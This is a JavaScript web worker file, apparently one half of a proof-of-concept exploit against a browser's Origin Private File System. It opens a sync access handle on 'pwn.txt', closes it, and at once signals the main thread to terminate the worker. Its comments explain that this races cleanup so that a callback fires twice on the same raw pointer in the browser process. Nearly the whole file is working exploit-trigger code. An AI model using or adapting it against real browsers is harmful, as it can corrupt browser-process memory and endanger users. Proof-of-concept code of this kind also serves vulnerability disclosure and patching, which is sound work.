// worker.js

async function triggerRace() {
    try {
        console.log("[Worker] Requesting OPFS directory...");
        const root = await navigator.storage.getDirectory();

        console.log("[Worker] Creating target file...");
        const fileHandle = await root.getFileHandle('pwn.txt', { create: true });

        // This creates the FileSystemAccessAccessHandleHostImpl in the Browser Process
        console.log("[Worker] Opening SyncAccessHandle...");
        const accessHandle = await fileHandle.createSyncAccessHandle();

        console.log("[Worker] Handle opened. Executing race...");

        // TASK A: Start the asynchronous close operation.
        // This sends the Mojo message to the Browser process to begin cleanup.
        accessHandle.close();

        // TASK B: Signal the main thread to terminate this worker IMMEDIATELY.
        // This will tear down the worker context, severing the Mojo pipe,
        // triggering the disconnect handler, and queuing the second 
        // RemoveAccessHandleHost callback with the same raw pointer.
        postMessage("RACE_NOW");

    } catch (e) {
        console.error("[Worker] Error:", e);
    }
}

triggerRace();
